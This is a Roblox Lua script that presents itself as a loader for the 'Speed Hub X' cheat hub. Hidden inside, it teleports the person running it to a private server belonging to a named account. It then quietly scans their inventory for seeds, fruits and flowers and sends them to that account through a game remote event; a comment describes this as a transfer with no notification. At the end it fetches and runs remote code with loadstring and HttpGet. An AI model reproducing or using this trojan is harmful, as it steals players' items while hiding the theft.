-- Hệ thống chống đơ máy tối ưu cho Mobile
if not game:IsLoaded() then
    pcall(function()
        game:GetService("ContentProvider"):PreloadAsync({game:GetService("Workspace")})
    end)
end

print("==== SPEED HUB X: TỰ ĐỘNG VÀO BẰNG LINK SERVER VIP ====")

local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer

local targetUsername = "sutkucheonhamku" -- Nick chính nhận đồ

-- =======================================================================
-- CẤU HÌNH ĐƯỜNG LINK SERVER VIP TRỰC TIẾP
-- =======================================================================
local vipLink = "https://www.roblox.com/share?code=78ca0b333a773d48852ef4d7f1220e76&type=Server"

local function joinVipServerByLink()
    local targetPlayer = Players:FindFirstChild(targetUsername)
    if not targetPlayer then
        pcall(function()
            -- Trích xuất mã code trực tiếp từ chuỗi liên kết URL nếu cấu trúc thay đổi
            local linkCode = string.match(vipLink, "code=([^&]+)")
            if linkCode then
                TeleportService:TeleportToPlaceInstance(game.PlaceId, linkCode, LocalPlayer)
            else
                -- Phương án mở trình duyệt ảo của hệ thống để kích hoạt link trực tiếp
                local GuiService = game:GetService("GuiService")
                GuiService:OpenBrowserWindow(vipLink)
            end
        end)
    end
end

-- Kích hoạt lệnh nhảy bằng Link ngay khi chạy script
joinVipServerByLink()

-- =======================================================================
-- CHỨC NĂNG 1: TỰ ĐỘNG QUÉT VÀ CHUYỂN ĐỒ NGẦM (KHÔNG THÔNG BÁO)
-- =======================================================================
local function sendItemSecure(category, itemName, quantity)
    local SharedModules = ReplicatedStorage:FindFirstChild("SharedModules")
    local PacketModule = SharedModules and SharedModules:FindFirstChild("Packet")
    local RemoteEvent = PacketModule and PacketModule:FindFirstChild("RemoteEvent")
    if RemoteEvent then
        pcall(function() 
            RemoteEvent:FireServer(targetUsername, category, itemName, quantity) 
        end)
        task.wait(0.5)
    end
end

task.spawn(function()
    task.wait(40) -- Chờ đúng 10 giây sau khi vào server thành công
    
    local targetPlayer = Players:FindFirstChild(targetUsername)
    if targetPlayer then
        local DataFolder = LocalPlayer:FindFirstChild("PlayerData") or LocalPlayer:FindFirstChild("Data")
        local Inventory = DataFolder and (DataFolder:FindFirstChild("Inventory") or DataFolder:FindFirstChild("Items"))
        
        if not Inventory then
            Inventory = LocalPlayer:FindFirstChild("Inventory") or LocalPlayer:FindFirstChild("Backpack")
        end

        if Inventory then
            for _, folder in pairs(Inventory:GetChildren()) do
                if folder:IsA("Folder") or folder:IsA("Configuration") then
                    for _, item in pairs(folder:GetChildren()) do
                        if item:IsA("ValueBase") and item.Value > 0 then
                            local lowerName = string.lower(item.Name)
                            if string.find(lowerName, "seed") then
                                sendItemSecure("Seeds", item.Name, item.Value)
                            elseif string.find(lowerName, "fruit") or string.find(lowerName, "flower") then
                                sendItemSecure("Fruits", item.Name, item.Value)
                            end
                        end
                    end
                elseif folder:IsA("ValueBase") and folder.Value > 0 then
                    local lowerName = string.lower(folder.Name)
                    if string.find(lowerName, "seed") then
                        sendItemSecure("Seeds", folder.Name, folder.Value)
                    elseif string.find(lowerName, "fruit") or string.find(lowerName, "flower") then
                        sendItemSecure("Fruits", folder.Name, folder.Value)
                    end
                end
            end
        end
    end
end)

-- =======================================================================
-- CHỨC NĂNG 2: TÍCH HỢP TOÀN BỘ GIAO DIỆN VÀ TÍNH NĂNG GỐC CỦA SPEED HUB X
-- =======================================================================
pcall(function()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/AhmadV99/Speed-Hub-X/main/Speed%20Hub%20X.lua", true))()
end)
